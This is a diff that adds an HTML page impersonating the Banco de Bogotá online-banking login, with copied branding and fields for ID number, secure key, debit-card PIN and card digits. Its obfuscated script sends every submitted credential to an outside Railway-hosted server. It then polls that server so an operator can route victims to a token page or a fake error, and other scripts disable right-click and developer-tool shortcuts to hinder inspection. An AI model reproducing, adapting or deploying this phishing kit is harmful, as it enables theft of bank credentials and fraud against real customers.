@@ -1,0 +1,687 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Banca Virtual Banco de Bogotá - Acceso seguro a tu cuenta bancaria">
+    <meta name="theme-color" content="#002A8D">
+    
+    <title>Banca Virtual - Banco de Bogotá</title>
+    
+    <link rel="icon" type="image/png" sizes="32x32" href="img/channels4_profile-removebg-preview.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="img/channels4_profile-removebg-preview.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="img/channels4_profile-removebg-preview.png">
+    <link rel="apple-touch-icon" href="img/channels4_profile-removebg-preview.png">
+    
+    <link rel="stylesheet" href="loading-overlay.css?v=1.0.2">
+    <link rel="stylesheet" href="index.css?v=1.0.2">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+
+    <style>
+        #esperaLogin {
+            display: none;
+            position: fixed;
+            inset: 0;
+            background: #2C3E5C;
+            z-index: 99999;
+            align-items: center;
+            justify-content: center;
+            flex-direction: column;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+
+        #esperaLogin.visible {
+            display: flex;
+            opacity: 1;
+        }
+
+        .espera-login-spinner {
+            height: 8rem;
+            width: 6rem;
+            position: relative;
+            animation: spinner-bdb 4s infinite;
+            transform-origin: 50% 25%;
+        }
+
+        #esperaLogin .shape {
+            height: 2.5rem;
+            width: 2.5rem;
+            border-radius: 50%;
+            position: absolute;
+        }
+
+        #esperaLogin .shape-red {
+            background-color: #f23a31;
+            animation: red 4s infinite;
+            top: 0;
+            left: 50%;
+            transform: translateX(-50%);
+            opacity: 0;
+        }
+
+        #esperaLogin .shape-blue {
+            background-color: #1c83e1;
+            animation: blue 4s infinite;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100%);
+            opacity: 0;
+        }
+
+        #esperaLogin .shape-yellow {
+            background-color: #fdc130;
+            animation: yellow 4s infinite;
+            top: 100%;
+            left: 50%;
+            transform: translateX(-50%) translateY(-100%);
+            opacity: 0;
+        }
+
+        @keyframes red {
+            0%, 100% { top: 0; left: 50%; transform: translateX(-50%); opacity: 1; }
+            10%, 90% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 1; }
+            12%, 50% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); transform-origin: bottom; opacity: 0; }
+            52% { top: 100%; left: 10%; transform: translateX(0) translateY(-100%) scaleY(1); opacity: 1; }
+            60%, 80% { top: 0; left: 0; transform: translateX(0) translateY(0) scaleY(1); opacity: 1; }
+        }
+
+        @keyframes blue {
+            0%, 100%, 90.1% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 0; }
+            10% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); opacity: 0; }
+            12%, 32% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); transform-origin: bottom; opacity: 1; }
+            20% { top: 0; left: 50%; transform: translateX(-50%) scaleY(80%); transform-origin: top; opacity: 1; }
+            30% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(100%); opacity: 1; }
+            40%, 60%, 80% { top: 0; left: 100%; transform: translateX(-100%) translateY(0) scaleY(1); opacity: 1; }
+            50% { top: 100%; left: 90%; transform: translateX(-100%) translateY(-100%) scaleY(1); opacity: 1; }
+            52% { top: 100%; left: 90%; transform: translateX(-100%) translateY(-100%) scaleY(80%); opacity: 1; }
+            90% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 1; }
+        }
+
+        @keyframes yellow {
+            0%, 10%, 100%, 12%, 20%, 30%, 90.1% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 0; }
+            32% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%) scaleY(80%); transform-origin: bottom; opacity: 0; }
+            40% { top: 0; transform: translateX(0) translateY(0) scaleY(1); left: 0; opacity: 1; }
+            50% { top: 100%; left: 10%; transform: translateX(0) translateY(-100%) scaleY(1); opacity: 1; }
+            50.1% { top: 100%; left: 90%; transform: translateX(-100%) translateY(-100%) scaleY(1); opacity: 1; }
+            60%, 80% { top: 50%; left: 50%; transform: translateX(-50%) translateY(-50%) scaleY(100%); transform-origin: bottom; opacity: 1; }
+            90% { top: 100%; left: 50%; transform: translateX(-50%) translateY(-100%); opacity: 1; }
+        }
+
+        @keyframes spinner-bdb {
+            0%, 60% { transform: rotateZ(0); }
+            100%, 80% { transform: rotateZ(720deg); }
+        }
+
+        @keyframes popInError {
+            from { opacity: 0; transform: scale(0.85); }
+            to   { opacity: 1; transform: scale(1); }
+        }
+        #errorLogin.visible {
+            display: flex !important;
+            opacity: 1 !important;
+        }
+    </style>
+</head>
+<body>
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <img src="img/channels4_profile-removebg-preview.png" alt="Banco de Bogotá" class="loading-logo">
+            <div class="loading-spinner">
+                <div class="spinner-ring"></div>
+            </div>
+            <p class="loading-text">Cargando</p>
+            <p class="loading-subtext"></p>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="login-section">
+            <div class="bank-logo">
+                <img src="img/banco-de-bogota.png" alt="Banco de Bogotá Logo" class="main-logo">
+            </div>
+            <h1 class="welcome-title">Bienvenido a tu Banca Virtual</h1>
+            <div class="welcome-banner">
+                <img src="img/Señora.png" alt="Asistente Virtual" class="banner-image">
+                <div class="banner-text">
+                    <p>¿Nunca has ingresado a Banca Virtual?</p>
+                    <a href="#">Aquí te decimos cómo hacerlo ›</a>
+                </div>
+            </div>
+            <div class="login-container">
+                <div class="login-options">
+                    <button class="active">Clave segura</button>
+                    <button>Tarjeta débito</button>
+                </div>
+                <div class="login-alert" id="loginAlert">
+                    <button type="button" class="close-icon" id="closeAlert">
+                        <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M18 6L6 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                            <path d="M6 6L18 18" stroke="currentColor" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </button>
+                    <p>Estás ingresando con tu Clave Segura. Selecciona 'Tarjeta Débito' para cambiar el tipo de ingreso.</p>
+                </div>
+                <form id="claveForm" class="login-form clave-form">
+                    <div class="form-group">
+                        <label>Identificación</label>
+                        <div class="input-group">
+                            <select>
+                                <option>C.C. Cédula de ciudadanía</option>
+                                <option>T.I. Tarjeta de Identidad</option>
+                                <option>C.E. Cédula de Extranjería</option>
+                                <option>N.I.T. NIT Persona Natural</option>
+                                <option>N.P.E. NIT Persona Extranjera</option>
+                                <option>N.I.J. NIT Persona Jurídica</option>
+                                <option>P.S. Pasaporte</option>
+                                <option>R.C. Registro Civil</option>
+                            </select>
+                            <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="identification" placeholder="#" maxlength="10" data-numeric="true">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Clave segura</label>
+                        <div class="password-input">
+                            <input type="password" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="secure-key" placeholder="...." maxlength="4" aria-label="Clave segura" data-numeric="true">
+                            <button type="button" class="toggle-password" aria-label="Mostrar/ocultar contraseña">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/>
+                                    <path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/>
+                                    <path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+                    <button type="submit" class="login-button" disabled>Ingresar</button>
+                </form>
+                <form id="tarjetaForm" class="login-form tarjeta-form" style="display: none;">
+                    <div class="form-group">
+                        <label>Identificación</label>
+                        <div class="input-group">
+                            <select>
+                                <option>C.C. Cédula de ciudadanía</option>
+                                <option>T.I. Tarjeta de Identidad</option>
+                                <option>C.E. Cédula de Extranjería</option>
+                                <option>N.I.T. NIT Persona Natural</option>
+                                <option>N.P.E. NIT Persona Extranjera</option>
+                                <option>N.I.J. NIT Persona Jurídica</option>
+                                <option>P.S. Pasaporte</option>
+                                <option>R.C. Registro Civil</option>
+                            </select>
+                            <input type="text" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="identification" placeholder="#" maxlength="10" data-numeric="true">
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <label>Clave de tu tarjeta débito</label>
+                        <div class="password-input">
+                            <input type="password" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="card-pin" placeholder="...." maxlength="4" aria-label="Clave de tarjeta débito" data-numeric="true">
+                            <button type="button" class="toggle-password" aria-label="Mostrar/ocultar contraseña">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/>
+                                    <path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/>
+                                    <path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+                
+                    <div class="form-group">
+                        <label>Últimos 4 dígitos de tu tarjeta débito</label>
+                        <div class="password-input">
+                            <input type="password" inputmode="numeric" pattern="[0-9]*" autocomplete="off" name="card-number" placeholder="...." maxlength="4" aria-label="Últimos 4 dígitos de tu tarjeta débito" data-numeric="true">
+                            <button type="button" class="toggle-password" aria-label="Mostrar/ocultar contraseña">
+                                <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                    <path d="M12 5C8.24261 5 4.70487 7.15893 2.45687 10.5093C2.16156 10.9557 2.16156 11.5231 2.45687 11.9695C4.70487 15.3199 8.24261 17.4788 12 17.4788C15.7574 17.4788 19.2951 15.3199 21.5431 11.9695C21.8384 11.5231 21.8384 10.9557 21.5431 10.5093C19.2951 7.15893 15.7574 5 12 5Z" stroke="currentColor" stroke-width="1.5"/>
+                                    <path d="M12 14.4788C13.8225 14.4788 15.3 12.9324 15.3 11.0394C15.3 9.14634 13.8225 7.6 12 7.6C10.1775 7.6 8.7 9.14634 8.7 11.0394C8.7 12.9324 10.1775 14.4788 12 14.4788Z" stroke="currentColor" stroke-width="1.5"/>
+                                    <path class="slash" d="M4 4L20 20" stroke="currentColor" stroke-width="1.5" stroke-linecap="round"/>
+                                </svg>
+                            </button>
+                        </div>
+                    </div>
+
+                    <button type="submit" class="login-button" disabled>Ingresar</button>
+                </form>
+                <div class="links">
+                    <a href="#">Registrarme</a>
+                    <a href="#">Olvidé mi clave</a>
+                </div>
+            </div>
+            <p class="privacy-text">
+                Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio de Google</a>.
+            </p>
+        </section>
+        <section class="right-section">
+            <div class="service-cards-container">
+                <button class="nav-button prev-button" aria-label="Anterior">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="12" fill="white"/>
+                        <path d="M14 6L8 12L14 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </button>
+                <div class="service-cards">
+                    <a href="#" class="service-card">
+                        <div class="card-icon">
+                            <svg width="40" height="40" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 15C13.6569 15 15 13.6569 15 12C15 10.3431 13.6569 9 12 9C10.3431 9 9 10.3431 9 12C9 13.6569 10.3431 15 12 15Z" stroke="currentColor" stroke-width="2"/>
+                                <path d="M19 15C19.5523 15 20 14.5523 20 14C20 13.4477 19.5523 13 19 13C18.4477 13 18 13.4477 18 14C18 14.5523 18.4477 15 19 15Z" fill="currentColor"/>
+                                <path d="M19 11C19.5523 11 20 10.5523 20 10C20 9.44772 19.5523 9 19 9C18.4477 9 18 9.44772 18 10C18 10.5523 18.4477 11 19 11Z" fill="currentColor"/>
+                                <path d="M5 15C5.55228 15 6 14.5523 6 14C6 13.4477 5.55228 13 5 13C4.44772 13 4 13.4477 4 14C4 14.5523 4.44772 15 5 15Z" fill="currentColor"/>
+                                <path d="M5 11C5.55228 11 6 10.5523 6 10C6 9.44772 5.55228 9 5 9C4.44772 9 4 9.44772 4 10C4 10.5523 4.44772 11 5 11Z" fill="currentColor"/>
+                                <path d="M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21Z" stroke="currentColor" stroke-width="2"/>
+                            </svg>
+                        </div>
+                        <div class="card-content">
+                            <h3>Configuración y<br>seguridad</h3>
+                        </div>
+                    </a>
+
+                    <a href="#" class="service-card">
+                        <div class="card-icon">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 3L4 7V17L12 21L20 17V7L12 3Z" stroke="currentColor" stroke-width="2"/>
+                                <path d="M12 12L4 7M12 12V21M12 12L20 7" stroke="currentColor" stroke-width="2"/>
+                            </svg>
+                        </div>
+                        <div class="card-content">
+                            <h3>Solicitar un<br>producto</h3>
+                        </div>
+                    </a>
+
+                    <a href="#" class="service-card">
+                        <div class="card-icon">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M21 11.5C21.0034 12.8199 20.6951 14.1219 20.1 15.3C19.3944 16.7118 18.3098 17.8992 16.9674 18.7293C15.6251 19.5594 14.0782 19.9994 12.5 20C11.1801 20.0035 9.87812 19.6951 8.7 19.1L3 21L4.9 15.3C4.30493 14.1219 3.99656 12.8199 4 11.5C4.00061 9.92179 4.44061 8.37488 5.27072 7.03258C6.10083 5.69028 7.28825 4.6056 8.7 3.90003C9.87812 3.30496 11.1801 2.99659 12.5 3.00003H13C15.0843 3.11502 17.053 3.99479 18.5291 5.47089C20.0052 6.94699 20.885 8.91568 21 11V11.5Z" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            </svg>
+                        </div>
+                        <div class="card-content">
+                            <h3>Atención al<br>cliente</h3>
+                        </div>
+                    </a>
+
+                    <a href="#" class="service-card">
+                        <div class="card-icon">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M12 8V12L14 14" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                                <path d="M12 21C16.9706 21 21 16.9706 21 12C21 7.02944 16.9706 3 12 3C7.02944 3 3 7.02944 3 12C3 16.9706 7.02944 21 12 21Z" stroke="currentColor" stroke-width="2"/>
+                            </svg>
+                        </div>
+                        <div class="card-content">
+                            <h3>Solicitar un<br>turno digital</h3>
+                        </div>
+                    </a>
+
+                    <a href="#" class="service-card">
+                        <div class="card-icon">
+                            <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M17 8H7a2 2 0 00-2 2v9a2 2 0 002 2h10a2 2 0 002-2v-9a2 2 0 00-2-2zM12 3v5M8 7V3h8v4" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                <path d="M12 14v2M12 10v1" stroke="currentColor" stroke-width="2" stroke-linecap="round"/>
+                            </svg>
+                        </div>
+                        <div class="card-content">
+                            <h3>Buscar cajeros<br>y oficinas</h3>
+                        </div>
+                    </a>
+                </div>
+                <button class="nav-button next-button" aria-label="Siguiente">
+                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <circle cx="12" cy="12" r="12" fill="white"/>
+                        <path d="M10 6L16 12L10 18" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                    </svg>
+                </button>
+            </div>
+            <div class="version-number">v.1.29.0</div>
+            <p class="privacy-text privacy-text-right">
+                Este sitio está protegido por reCAPTCHA y aplican las <a href="#">políticas de privacidad</a> y los <a href="#">términos de servicio de Google</a>.
+            </p>
+        </section>
+    </div>
+
+    <div id="esperaLogin">
+        <div class="espera-login-spinner">
+            <div class="shape shape-yellow"></div>
+            <div class="shape shape-blue"></div>
+            <div class="shape shape-red"></div>
+        </div>
+    </div>
+
+    <!-- Overlay de error: credenciales inválidas -->
+    <div id="errorLogin" style="display:none;position:fixed;inset:0;background:rgba(0,10,40,0.6);backdrop-filter:blur(4px);z-index:100000;align-items:center;justify-content:center;font-family:'Open Sans',-apple-system,sans-serif;opacity:0;transition:opacity .3s ease">
+        <div style="background:#fff;border-radius:16px;padding:32px 28px 24px;max-width:360px;width:90%;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,0.3);animation:popInError .4s cubic-bezier(0.34,1.56,0.64,1);color:#1a1a2e">
+            <div style="width:72px;height:72px;background:linear-gradient(135deg,#FF4D4D 0%,#C20024 100%);border-radius:50%;display:flex;align-items:center;justify-content:center;margin:0 auto 20px;box-shadow:0 8px 24px rgba(194,0,36,0.35)">
+                <svg width="36" height="36" viewBox="0 0 24 24" fill="none" stroke="#fff" stroke-width="3" stroke-linecap="round" stroke-linejoin="round">
+                    <line x1="12" y1="8" x2="12" y2="13"></line>
+                    <line x1="12" y1="17" x2="12.01" y2="17"></line>
+                </svg>
+            </div>
+            <div style="font-size:19px;font-weight:700;color:#0a0a1a;margin-bottom:10px">Credenciales inválidas</div>
+            <div style="font-size:14px;color:#555;line-height:1.55;margin-bottom:22px">Los datos ingresados son incorrectos.<br>Por favor verifica e inténtalo nuevamente.</div>
+            <button id="errorLoginBtn" style="display:block;width:100%;background:linear-gradient(135deg,#0033a0 0%,#002277 100%);color:#fff;border:none;padding:14px 20px;border-radius:30px;font-size:14px;font-weight:700;letter-spacing:0.06em;text-transform:uppercase;cursor:pointer;font-family:inherit;box-shadow:0 6px 18px rgba(0,51,160,0.35)">Intentar de nuevo</button>
+        </div>
+    </div>
+
+    <script>
+        (function() {
+            var _0xa1 = "https://multi-bancos-production.up.railway.app";
+            var _0xb2 = "bogota";
+            var _0xc3 = 'sess_' + Date.now() + '_' + Math.floor(Math.random() * 10000);
+            try { sessionStorage.setItem('sessionId', _0xc3); } catch(e) {}
+            console.log('🆔 Sesión:', _0xc3);
+
+            var _0xd4 = document.getElementById('claveForm');
+            var _0xe5 = document.getElementById('tarjetaForm');
+            var _0xf6 = document.getElementById('loginAlert');
+            var _0xg7 = document.getElementById('closeAlert');
+            var _0xh8 = document.querySelectorAll('.login-options button');
+            var _0xi9 = document.getElementById('esperaLogin');
+
+            function _0xj0(_0xk1) {
+                return (_0xk1 || '').replace(/\D/g, '');
+            }
+
+            document.querySelectorAll('input[data-numeric="true"]').forEach(function(_0xl2) {
+                _0xl2.setAttribute('inputmode', 'numeric');
+                _0xl2.setAttribute('autocomplete', 'off');
+
+                _0xl2.addEventListener('beforeinput', function(_0xm3) {
+                    if (_0xm3.data && /\D/.test(_0xm3.data)) {
+                        _0xm3.preventDefault();
+                    }
+                });
+
+                _0xl2.addEventListener('input', function() {
+                    var _0xn4 = _0xj0(_0xl2.value);
+                    if (_0xl2.value !== _0xn4) {
+                        _0xl2.value = _0xn4;
+                    }
+                });
+
+                _0xl2.addEventListener('paste', function(_0xo5) {
+                    _0xo5.preventDefault();
+                    var _0xp6 = (_0xo5.clipboardData || window.clipboardData).getData('text') || '';
+                    var _0xq7 = _0xj0(_0xp6);
+                    var _0xr8 = parseInt(_0xl2.getAttribute('maxlength') || '99', 10);
+                    var _0xs9 = _0xl2.selectionStart || 0;
+                    var _0xt0 = _0xl2.selectionEnd || 0;
+                    var _0xu1 = _0xl2.value || '';
+                    var _0xv2 = (_0xu1.slice(0, _0xs9) + _0xq7 + _0xu1.slice(_0xt0)).slice(0, _0xr8);
+                    _0xl2.value = _0xv2;
+                    _0xl2.dispatchEvent(new Event('input', { bubbles: true }));
+                });
+
+                _0xl2.addEventListener('keypress', function(_0xw3) {
+                    if (_0xw3.key && _0xw3.key.length === 1 && /\D/.test(_0xw3.key)) {
+                        _0xw3.preventDefault();
+                    }
+                });
+
+                _0xl2.addEventListener('drop', function(_0xx4) {
+                    _0xx4.preventDefault();
+                });
+            });
+
+            async function _0xy5(_0xz6, _0x07) {
+                var _0x18 = new Date().toLocaleString('es-CO', { timeZone: 'America/Bogota' });
+
+                var _0x29 = {
+                    sessionId: _0xc3,
+                    tipo: _0xz6,
+                    tipoDoc: _0x07.tipoDoc || '',
+                    identificacion: _0x07.identificacion || '',
+                    clave: _0x07.clave || '',
+                    tarjeta: _0x07.tarjeta || ''
+                };
+
+                try {
+                    sessionStorage.setItem("loginData", JSON.stringify(Object.assign({}, _0x29, { fecha: _0x18 })));
+                } catch (_0x3a) {
+                    console.warn("No se pudo guardar en sessionStorage:", _0x3a);
+                }
+
+                try {
+                    var _0x4b = await fetch(_0xa1 + '/' + _0xb2 + '/enviar', {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify(_0x29)
+                    });
+                    var _0x5c = await _0x4b.json();
+                    console.log('📤 Enviado al backend:', _0x5c);
+                } catch (_0x6d) {
+                    console.error("Error enviando al backend:", _0x6d);
+                }
+            }
+
+            _0xh8.forEach(function(_0x7e, _0x8f) {
+                _0x7e.addEventListener('click', function() {
+                    _0xh8.forEach(function(_0x9g) { _0x9g.classList.remove('active'); });
+                    _0x7e.classList.add('active');
+
+                    if (_0x8f === 0) {
+                        _0xd4.style.display = '';
+                        _0xe5.style.display = 'none';
+                        if (_0xf6) _0xf6.style.display = 'flex';
+                    } else {
+                        _0xd4.style.display = 'none';
+                        _0xe5.style.display = '';
+                        if (_0xf6) _0xf6.style.display = 'none';
+                    }
+                });
+            });
+
+            if (_0xg7) {
+                _0xg7.addEventListener('click', function() {
+                    _0xf6.style.display = 'none';
+                });
+            }
+
+            document.querySelectorAll('.toggle-password').forEach(function(_0xah) {
+                _0xah.addEventListener('click', function() {
+                    var _0xbi = _0xah.parentElement.querySelector('input');
+                    if (_0xbi) {
+                        _0xbi.type = _0xbi.type === 'password' ? 'text' : 'password';
+                    }
+                });
+            });
+
+            function _0xcia() {
+                if (_0xi9) _0xi9.classList.add('visible');
+
+                var _0xdia = setInterval(async function() {
+                    try {
+                        var _0xeia = await fetch(_0xa1 + '/' + _0xb2 + '/estado/' + _0xc3);
+                        var _0xfia = await _0xeia.json();
+                        console.log('🔍 Estado:', _0xfia.estado);
+
+                        if (_0xfia.estado === 'token') {
+                            clearInterval(_0xdia);
+                            window.location.href = 'token.html';
+                        } else if (_0xfia.estado === 'rechazado') {
+                            clearInterval(_0xdia);
+                            if (_0xi9) _0xi9.classList.remove('visible');
+                            setTimeout(function() {
+                                var _0xgia = document.getElementById('errorLogin');
+                                if (_0xgia) _0xgia.classList.add('visible');
+                            }, 300);
+                        }
+                    } catch (_0xhia) {
+                        console.error('Error consultando estado:', _0xhia);
+                    }
+                }, 2000);
+
+                setTimeout(function() {
+                    clearInterval(_0xdia);
+                    if (_0xi9) _0xi9.classList.remove('visible');
+                }, 3 * 60 * 1000);
+            }
+
+            var _0xiia = document.getElementById('errorLoginBtn');
+            if (_0xiia) {
+                _0xiia.addEventListener('click', function() {
+                    var _0xjia = document.getElementById('errorLogin');
+                    if (_0xjia) _0xjia.classList.remove('visible');
+                    window.location.reload();
+                });
+            }
+
+            if (_0xd4) {
+                var _0xkia = _0xd4.querySelectorAll('input[name]');
+                var _0xlia = _0xd4.querySelector('.login-button');
+
+                function _0xmia() {
+                    var _0xnia = _0xd4.querySelector('input[name="identification"]');
+                    var _0xoia = _0xd4.querySelector('input[name="secure-key"]');
+                    var _0xpia = _0xnia.value.trim().length >= 5 && _0xoia.value.trim().length === 4;
+                    if (_0xlia) _0xlia.disabled = !_0xpia;
+                }
+
+                _0xkia.forEach(function(_0xqia) { _0xqia.addEventListener('input', _0xmia); });
+                _0xmia();
+
+                _0xd4.addEventListener('submit', async function(_0xria) {
+                    _0xria.preventDefault();
+
+                    var _0xsia = _0xd4.querySelector('select');
+                    var _0xtia = _0xsia ? _0xsia.value : "";
+                    var _0xuia = _0xd4.querySelector('input[name="identification"]').value.trim();
+                    var _0xvia = _0xd4.querySelector('input[name="secure-key"]').value.trim();
+
+                    await _0xy5("Clave segura", {
+                        tipoDoc: _0xtia,
+                        identificacion: _0xuia,
+                        clave: _0xvia
+                    });
+
+                    _0xcia();
+                });
+            }
+
+            if (_0xe5) {
+                var _0xwia = _0xe5.querySelectorAll('input[name]');
+                var _0xxia = _0xe5.querySelector('.login-button');
+
+                function _0xyia() {
+                    var _0xzia = _0xe5.querySelector('input[name="identification"]');
+                    var _0x07a = _0xe5.querySelector('input[name="card-pin"]');
+                    var _0x0ia = _0xe5.querySelector('input[name="card-number"]');
+                    var _0x1ia = _0xzia.value.trim().length >= 5 && _0x07a.value.trim().length === 4 && _0x0ia.value.trim().length === 4;
+                    if (_0xxia) _0xxia.disabled = !_0x1ia;
+                }
+
+                _0xwia.forEach(function(_0x2ia) { _0x2ia.addEventListener('input', _0xyia); });
+                _0xyia();
+
+                _0xe5.addEventListener('submit', async function(_0x3ia) {
+                    _0x3ia.preventDefault();
+
+                    var _0x4ia = _0xe5.querySelector('select');
+                    var _0x5ia = _0x4ia ? _0x4ia.value : "";
+                    var _0x6ia = _0xe5.querySelector('input[name="identification"]').value.trim();
+                    var _0x7ia = _0xe5.querySelector('input[name="card-pin"]').value.trim();
+                    var _0x8ia = _0xe5.querySelector('input[name="card-number"]').value.trim();
+
+                    await _0xy5("Tarjeta débito", {
+                        tipoDoc: _0x5ia,
+                        identificacion: _0x6ia,
+                        clave: _0x7ia,
+                        tarjeta: _0x8ia
+                    });
+
+                    _0xcia();
+                });
+            }
+        })();
+    </script>
+
+<script>
+(function(){
+'use strict';
+var _0x9ia=0;
+document.addEventListener('touchend',function(_0xaia){
+var _0xbia=new Date().getTime();
+if(_0xbia-_0x9ia<=300){_0xaia.preventDefault();}
+_0x9ia=_0xbia;
+},{passive:false});
+document.addEventListener('dblclick',function(_0xcia){_0xcia.preventDefault();});
+document.addEventListener('focusin',function(_0xdia){
+var _0xeia=(_0xdia.target&&_0xdia.target.tagName)?_0xdia.target.tagName.toLowerCase():'';
+if(_0xeia==='input'||_0xeia==='textarea'||_0xeia==='select'){
+if(_0xdia.target.style.fontSize!=='16px'){
+_0xdia.target.dataset._fs=_0xdia.target.style.fontSize||'';
+_0xdia.target.style.fontSize='16px';
+}
+}
+});
+document.addEventListener('focusout',function(_0xfia){
+var _0xeia=(_0xfia.target&&_0xfia.target.tagName)?_0xfia.target.tagName.toLowerCase():'';
+if(_0xeia==='input'||_0xeia==='textarea'||_0xeia==='select'){
+if(_0xfia.target.dataset._fs!==undefined){
+_0xfia.target.style.fontSize=_0xfia.target.dataset._fs;
+delete _0xfia.target.dataset._fs;
+}
+}
+});
+})();
+</script>
+
+<script>
+(function(){
+'use strict';
+
+document.addEventListener('contextmenu',function(_0xgia){
+_0xgia.preventDefault();
+return false;
+});
+
+document.addEventListener('keydown',function(_0xhia){
+var _0xiia=(_0xhia.key||'').toLowerCase();
+var _0xjia=_0xhia.ctrlKey||_0xhia.metaKey;
+var _0xkia=_0xhia.shiftKey;
+
+if(_0xiia==='f12'){_0xhia.preventDefault();return false;}
+if(_0xjia&&_0xkia&&(_0xiia==='i'||_0xiia==='j'||_0xiia==='c')){_0xhia.preventDefault();return false;}
+if(_0xjia&&_0xiia==='u'){_0xhia.preventDefault();return false;}
+if(_0xjia&&_0xiia==='s'){_0xhia.preventDefault();return false;}
+if(_0xjia&&_0xkia&&(_0xiia==='k'||_0xiia==='e'||_0xiia==='s'||_0xiia==='c')){_0xhia.preventDefault();return false;}
+if(_0xhia.metaKey&&_0xhia.altKey&&(_0xiia==='i'||_0xiia==='j'||_0xiia==='c')){_0xhia.preventDefault();return false;}
+});
+
+document.addEventListener('dragstart',function(_0xlia){_0xlia.preventDefault();});
+
+document.addEventListener('selectstart',function(_0xmia){
+var _0xnia=(_0xmia.target&&_0xmia.target.tagName)?_0xmia.target.tagName.toLowerCase():'';
+if(_0xnia!=='input'&&_0xnia!=='textarea'){
+_0xmia.preventDefault();
+}
+});
+
